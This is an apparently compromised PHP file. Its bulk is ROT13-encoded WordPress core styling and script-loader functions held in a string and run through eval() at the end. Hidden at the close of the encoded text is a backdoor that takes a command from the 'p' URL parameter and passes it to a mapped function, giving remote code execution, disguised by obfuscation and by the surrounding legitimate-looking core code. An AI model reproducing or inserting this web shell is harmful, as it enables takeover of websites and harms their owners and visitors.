shapgvba _jc_abeznyvmr_eryngvir_pff_yvaxf( $pff, $fglyrfurrg_hey ) {
	erghea cert_ercynpr_pnyyonpx(
		'#(hey\f*\(\f*[\'\"]?\f*)([^\'\"\)]+)#',
		fgngvp shapgvba ( $zngpurf ) hfr ( $fglyrfurrg_hey ) {
			yvfg( , $cersvk, $hey ) = $zngpurf;

			// Fubeg-pvephvg vs gur HEY qbrf abg erdhver abeznyvmngvba.
			vs (
				fge_fgnegf_jvgu( $hey, 'uggc:' ) ||
				fge_fgnegf_jvgu( $hey, 'uggcf:' ) ||
				fge_fgnegf_jvgu( $hey, '/' ) ||
				fge_fgnegf_jvgu( $hey, '#' ) ||
				fge_fgnegf_jvgu( $hey, 'qngn:' )
			) {
				erghea $zngpurf[0];
			}

			// Ohvyq gur nofbyhgr HEY.
			$nofbyhgr_hey = qveanzr( $fglyrfurrg_hey ) . '/' . $hey;
			$nofbyhgr_hey = fge_ercynpr( '/./', '/', $nofbyhgr_hey );

			// Pbaireg gb HEY eryngrq gb gur fvgr ebbg.
			$hey = jc_znxr_yvax_eryngvir( $nofbyhgr_hey );

			erghea $cersvk . $hey;
		},
		$pff
	);
}

/**
 * Shapgvba gung radhrhrf gur PFF Phfgbz Cebcregvrf pbzvat sebz gurzr.wfba.
 *
 * @fvapr 5.9.0
 */
shapgvba jc_radhrhr_tybony_fglyrf_pff_phfgbz_cebcregvrf() {
	jc_ertvfgre_fglyr( 'tybony-fglyrf-pff-phfgbz-cebcregvrf', snyfr );
	jc_nqq_vayvar_fglyr( 'tybony-fglyrf-pff-phfgbz-cebcregvrf', jc_trg_tybony_fglyrfurrg( neenl( 'inevnoyrf' ) ) );
	jc_radhrhr_fglyr( 'tybony-fglyrf-pff-phfgbz-cebcregvrf' );
}

/**
 * Ubbxf vayvar fglyrf va gur cebcre cynpr, qrcraqvat ba gur npgvir gurzr.
 *
 * @fvapr 5.9.1
 * @fvapr 6.1.0 Nqqrq gur `$cevbevgl` cnenzrgre.
 *
 * Sbe oybpx gurzrf, fglyrf ner ybnqrq va gur urnq.
 * Sbe pynffvp barf, fglyrf ner ybnqrq va gur obql orpnhfr gur jc_urnq npgvba unccraf orsber eraqre_oybpx.
 *
 * @yvax uggcf://pber.genp.jbeqcerff.bet/gvpxrg/53494.
 *
 * @cnenz fgevat $fglyr    Fgevat pbagnvavat gur PFF fglyrf gb or nqqrq.
 * @cnenz vag    $cevbevgl Gb frg gur cevbevgl sbe gur nqq_npgvba.
 */
shapgvba jc_radhrhr_oybpx_fhccbeg_fglyrf( $fglyr, $cevbevgl = 10 ) {
	$npgvba_ubbx_anzr = 'jc_sbbgre';
	vs ( jc_vf_oybpx_gurzr() ) {
		$npgvba_ubbx_anzr = 'jc_urnq';
	}
	nqq_npgvba(
		$npgvba_ubbx_anzr,
		fgngvp shapgvba () hfr ( $fglyr ) {
			rpub \"<fglyr>$fglyr</fglyr>\a\";
		},
		$cevbevgl
	);
}

/**
 * Srgpurf, cebprffrf naq pbzcvyrf fgberq pber fglyrf, gura pbzovarf naq eraqref gurz gb gur cntr.
 * Fglyrf ner fgberq ivn gur fglyr ratvar NCV.
 *
 * @yvax uggcf://qrirybcre.jbeqcerff.bet/oybpx-rqvgbe/ersrerapr-thvqrf/cnpxntrf/cnpxntrf-fglyr-ratvar/
 *
 * @fvapr 6.1.0
 *
 * @cnenz neenl $bcgvbaf {
 *     Bcgvbany. Na neenl bs bcgvbaf gb cnff gb jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pbagrkg().
 *     Qrsnhyg rzcgl neenl.
 *
 *     @glcr obby $bcgvzvmr Jurgure gb bcgvzvmr gur PFF bhgchg, r.t., pbzovar ehyrf.
 *                          Qrsnhyg snyfr.
 *     @glcr obby $cerggvsl Jurgure gb nqq arj yvarf naq vaqragf gb bhgchg.
 *                          Qrsnhyg gb jurgure gur `FPEVCG_QROHT` pbafgnag vf qrsvarq.
 * }
 */
shapgvba jc_radhrhr_fgberq_fglyrf( $bcgvbaf = neenl() ) {
	$vf_oybpx_gurzr   = jc_vf_oybpx_gurzr();
	$vf_pynffvp_gurzr = ! $vf_oybpx_gurzr;

	/*
	 * Sbe oybpx gurzrf, guvf shapgvba cevagf fgberq fglyrf va gur urnqre.
	 * Sbe pynffvp gurzrf, va gur sbbgre.
	 */
	vs (
		( $vf_oybpx_gurzr && qbvat_npgvba( 'jc_sbbgre' ) ) ||
		( $vf_pynffvp_gurzr && qbvat_npgvba( 'jc_radhrhr_fpevcgf' ) )
	) {
		erghea;
	}

	$pber_fglyrf_xrlf         = neenl( 'oybpx-fhccbegf' );
	$pbzcvyrq_pber_fglyrfurrg = '';
	$fglyr_gnt_vq             = 'pber';
	// Nqqf pbzzrag vs pbqr vf cerggvsvrq gb vqragvsl pber fglyrf frpgvbaf va qrohttvat.
	$fubhyq_cerggvsl = vffrg( $bcgvbaf['cerggvsl'] ) ? gehr === $bcgvbaf['cerggvsl'] : qrsvarq( 'FPEVCG_QROHT' ) && FPEVCG_QROHT;
	sbernpu ( $pber_fglyrf_xrlf nf $fglyr_xrl ) {
		vs ( $fubhyq_cerggvsl ) {
			$pbzcvyrq_pber_fglyrfurrg .= \"/**\a * Pber fglyrf: $fglyr_xrl\a */\a\";
		}
		// Punvaf pber fgber vqf gb fvtavsl jung gur fglyrf pbagnva.
		$fglyr_gnt_vq             .= '-' . $fglyr_xrl;
		$pbzcvyrq_pber_fglyrfurrg .= jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pbagrkg( $fglyr_xrl, $bcgvbaf );
	}

	// Pbzovarf Pber fglyrf.
	vs ( ! rzcgl( $pbzcvyrq_pber_fglyrfurrg ) ) {
		jc_ertvfgre_fglyr( $fglyr_gnt_vq, snyfr );
		jc_nqq_vayvar_fglyr( $fglyr_gnt_vq, $pbzcvyrq_pber_fglyrfurrg );
		jc_radhrhr_fglyr( $fglyr_gnt_vq );
	}

	// Cevagf bhg nal bgure fgberf ertvfgrerq ol gurzrf be bgurejvfr.
	$nqqvgvbany_fgberf = JC_Fglyr_Ratvar_PFF_Ehyrf_Fgber::trg_fgberf();
	sbernpu ( neenl_xrlf( $nqqvgvbany_fgberf ) nf $fgber_anzr ) {
		vs ( va_neenl( $fgber_anzr, $pber_fglyrf_xrlf, gehr ) ) {
			pbagvahr;
		}
		$fglyrf = jc_fglyr_ratvar_trg_fglyrfurrg_sebz_pbagrkg( $fgber_anzr, $bcgvbaf );
		vs ( ! rzcgl( $fglyrf ) ) {
			$xrl = \"jc-fglyr-ratvar-$fgber_anzr\";
			jc_ertvfgre_fglyr( $xrl, snyfr );
			jc_nqq_vayvar_fglyr( $xrl, $fglyrf );
			jc_radhrhr_fglyr( $xrl );
		}
	}
}

/**
 * Radhrhrf n fglyrfurrg sbe n fcrpvsvp oybpx.
 *
 * Vs gur gurzr unf bcgrq-va gb ybnq oybpx fglyrf ba qrznaq,
 * gura gur fglyrfurrg jvyy or radhrhrq ba-eraqre,
 * bgurejvfr jura gur oybpx vavgf.
 *
 * @fvapr 5.9.0
 *
 * @cnenz fgevat $oybpx_anzr Gur oybpx-anzr, vapyhqvat anzrfcnpr.
 * @cnenz neenl  $netf       {
 *     Na neenl bs nethzragf. Frr jc_ertvfgre_fglyr() sbe shyy vasbezngvba nobhg rnpu nethzrag.
 *
 *     @glcr fgevat           $unaqyr Gur unaqyr sbe gur fglyrfurrg.
 *     @glcr fgevat|snyfr     $fep    Gur fbhepr HEY bs gur fglyrfurrg.
 *     @glcr fgevat[]         $qrcf   Neenl bs ertvfgrerq fglyrfurrg unaqyrf guvf fglyrfurrg qrcraqf ba.
 *     @glcr fgevat|obby|ahyy $ire    Fglyrfurrg irefvba ahzore.
 *     @glcr fgevat           $zrqvn  Gur zrqvn sbe juvpu guvf fglyrfurrg unf orra qrsvarq.
 *     @glcr fgevat|ahyy      $cngu   Nofbyhgr cngu gb gur fglyrfurrg, fb gung vg pna cbgragvnyyl or vayvarq.
 * }
 */
shapgvba jc_radhrhr_oybpx_fglyr( $oybpx_anzr, $netf ) {
	$netf = jc_cnefr_netf(
		$netf,
		neenl(
			'unaqyr' => '',
			'fep'    => '',
			'qrcf'   => neenl(),
			'ire'    => snyfr,
			'zrqvn'  => 'nyy',
		)
	);

	/**
	 * Pnyyonpx shapgvba gb ertvfgre naq radhrhr fglyrf.
	 *
	 * @cnenz fgevat $pbagrag Jura gur pnyyonpx vf hfrq sbe gur eraqre_oybpx svygre,
	 *                        gur pbagrag arrqf gb or erghearq fb gur shapgvba cnenzrgre
	 *                        vf gb rafher gur pbagrag rkvfgf.
	 * @erghea fgevat Oybpx pbagrag.
	 */
	$pnyyonpx = fgngvp shapgvba ( $pbagrag ) hfr ( $netf ) {
		// Ertvfgre gur fglyrfurrg.
		vs ( ! rzcgl( $netf['fep'] ) ) {
			jc_ertvfgre_fglyr( $netf['unaqyr'], $netf['fep'], $netf['qrcf'], $netf['ire'], $netf['zrqvn'] );
		}

		// Nqq `cngu` qngn vs cebivqrq.
		vs ( vffrg( $netf['cngu'] ) ) {
			jc_fglyr_nqq_qngn( $netf['unaqyr'], 'cngu', $netf['cngu'] );

			// Trg gur EGY svyr cngu.
			$egy_svyr_cngu = fge_ercynpr( '.pff', '-egy.pff', $netf['cngu'] );

			// Nqq EGY fglyrfurrg.
			vs ( svyr_rkvfgf( $egy_svyr_cngu ) ) {
				jc_fglyr_nqq_qngn( $netf['unaqyr'], 'egy', 'ercynpr' );

				vs ( vf_egy() ) {
					jc_fglyr_nqq_qngn( $netf['unaqyr'], 'cngu', $egy_svyr_cngu );
				}
			}
		}

		// Radhrhr gur fglyrfurrg.
		jc_radhrhr_fglyr( $netf['unaqyr'] );

		erghea $pbagrag;
	};

	$ubbx = qvq_npgvba( 'jc_radhrhr_fpevcgf' ) ? 'jc_sbbgre' : 'jc_radhrhr_fpevcgf';
	vs ( jc_fubhyq_ybnq_oybpx_nffrgf_ba_qrznaq() ) {
		/**
		 * Pnyyonpx shapgvba gb ertvfgre naq radhrhr fglyrf.
		 *
		 * @cnenz fgevat $pbagrag Gur oybpx pbagrag.
		 * @cnenz neenl  $oybpx   Gur shyy oybpx, vapyhqvat anzr naq nggevohgrf.
		 * @erghea fgevat Oybpx pbagrag.
		 */
		$pnyyonpx_frcnengr = fgngvp shapgvba ( $pbagrag, $oybpx ) hfr ( $oybpx_anzr, $pnyyonpx ) {
			vs ( ! rzcgl( $oybpx['oybpxAnzr'] ) && $oybpx_anzr === $oybpx['oybpxAnzr'] ) {
				erghea $pnyyonpx( $pbagrag );
			}
			erghea $pbagrag;
		};

		/*
		 * Gur svygre'f pnyyonpx urer vf na nabalzbhf shapgvba orpnhfr
		 * hfvat n anzrq shapgvba va guvf pnfr vf abg cbffvoyr.
		 *
		 * Gur shapgvba pnaabg or haubbxrq, ubjrire, hfref ner fgvyy noyr
		 * gb qrdhrhr gur fglyrfurrgf ertvfgrerq/radhrhrq ol gur pnyyonpx
		 * juvpu vf jul va guvf pnfr, hfvat na nabalzbhf shapgvba
		 * jnf qrrzrq npprcgnoyr.
		 */
		nqq_svygre( 'eraqre_oybpx', $pnyyonpx_frcnengr, 10, 2 );
		erghea;
	}

	/*
	 * Gur svygre'f pnyyonpx urer vf na nabalzbhf shapgvba orpnhfr
	 * hfvat n anzrq shapgvba va guvf pnfr vf abg cbffvoyr.
	 *
	 * Gur shapgvba pnaabg or haubbxrq, ubjrire, hfref ner fgvyy noyr
	 * gb qrdhrhr gur fglyrfurrgf ertvfgrerq/radhrhrq ol gur pnyyonpx
	 * juvpu vf jul va guvf pnfr, hfvat na nabalzbhf shapgvba
	 * jnf qrrzrq npprcgnoyr.
	 */
	nqq_svygre( $ubbx, $pnyyonpx );

	// Radhrhr nffrgf va gur rqvgbe.
	nqq_npgvba( 'radhrhr_oybpx_nffrgf', $pnyyonpx );
}

/**
 * Ybnqf pynffvp gurzr fglyrf ba pynffvp gurzrf va gur sebagraq.
 *
 * Guvf vf hfrq sbe onpxjneqf pbzcngvovyvgl sbe Ohggba naq Svyr oybpxf fcrpvsvpnyyl.
 *
 * @fvapr 6.1.0
 * @fvapr 6.2.0 Nqqrq Svyr oybpx fglyrf.
 * @fvapr 6.8.0 Zbirq fglyrfurrg ertvfgengvba bhgfvqr bs guvf shapgvba.
 */
shapgvba jc_radhrhr_pynffvp_gurzr_fglyrf() {
	vs ( ! jc_gurzr_unf_gurzr_wfba() ) {
		jc_radhrhr_fglyr( 'pynffvp-gurzr-fglyrf' );
	}
}

/**
 * Erzbirf yrnqvat naq genvyvat _rzcgl_ fpevcg gntf.
 *
 * Guvf vf n urycre zrnag gb or hfrq sbe yvgreny fpevcg gnt pbafgehpgvba
 * jvguva `jc_trg_vayvar_fpevcg_gnt()` be `jc_cevag_vayvar_fpevcg_gnt()`.
 * Vg erzbirf gur yvgreny inyhrf bs \"<fpevcg>\" naq \"</fpevcg>\" sebz
 * nebhaq na vayvar fpevcg nsgre gevzzvat juvgrfcnpr. Glcvpnyyl guvf
 * vf hfrq va pbawhapgvba jvgu bhgchg ohssrevat, jurer `bo_trg_pyrna()`
 * vf cnffrq nf gur `$pbagragf` nethzrag.
 *
 * Rknzcyr:
 *
 *     // Fgevcf rknpg yvgreny rzcgl FPEVCG gntf.
 *     $wf = '<fpevcg>fnlUryyb();</fpevcg>;
 *     'fnlUryyb();' === jc_erzbir_fheebhaqvat_rzcgl_fpevcg_gntf( $wf );
 *
 *     // Bgurejvfr vs nalguvat vf qvssrerag vg jneaf va gur WF pbafbyr.
 *     $wf = '<fpevcg glcr=\"grkg/wninfpevcg\">pbafbyr.ybt( \"uv\" );</fpevcg>';
 *     'pbafbyr.reebe( ... )' === jc_erzbir_fheebhaqvat_rzcgl_fpevcg_gntf( $wf );
 *
 * @fvapr 6.4.0
 * @npprff cevingr
 *
 * @frr jc_cevag_vayvar_fpevcg_gnt()
 * @frr jc_trg_vayvar_fpevcg_gnt()
 *
 * @cnenz fgevat $pbagragf Fpevcg obql jvgu znahnyyl perngrq FPEVCG gnt yvgrenyf.
 * @erghea fgevat Fpevcg obql jvgubhg fheebhaqvat fpevcg gnt yvgrenyf, be
 *                bevtvany pbagragf vs obgu rknpg yvgrenyf nera'g cerfrag.
 */
shapgvba jc_erzbir_fheebhaqvat_rzcgl_fpevcg_gntf( $pbagragf ) {
	$pbagragf = gevz( $pbagragf );
	$bcrare   = '<FPEVCG>';
	$pybfre   = '</FPEVCG>';

	vs (
		fgeyra( $pbagragf ) > fgeyra( $bcrare ) + fgeyra( $pybfre ) &&
		fgegbhccre( fhofge( $pbagragf, 0, fgeyra( $bcrare ) ) ) === $bcrare &&
		fgegbhccre( fhofge( $pbagragf, -fgeyra( $pybfre ) ) ) === $pybfre
	) {
		erghea fhofge( $pbagragf, fgeyra( $bcrare ), -fgeyra( $pybfre ) );
	} ryfr {
		$reebe_zrffntr = __( 'Rkcrpgrq fgevat gb fgneg jvgu fpevcg gnt (jvgubhg nggevohgrf) naq raq jvgu fpevcg gnt, jvgu bcgvbany juvgrfcnpr.' );
		_qbvat_vg_jebat( __SHAPGVBA__, $reebe_zrffntr, '6.4' );
		erghea fcevags(
			'pbafbyr.reebe(%f)',
			jc_wfba_rapbqr(
				fcevags(
					/* genafyngbef: %f: jc_erzbir_fheebhaqvat_rzcgl_fpevcg_gntf() */
					__( 'Shapgvba %f hfrq vapbeerpgyl va CUC.' ),
					'jc_erzbir_fheebhaqvat_rzcgl_fpevcg_gntf()'
				) . ' ' . $reebe_zrffntr
			)
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>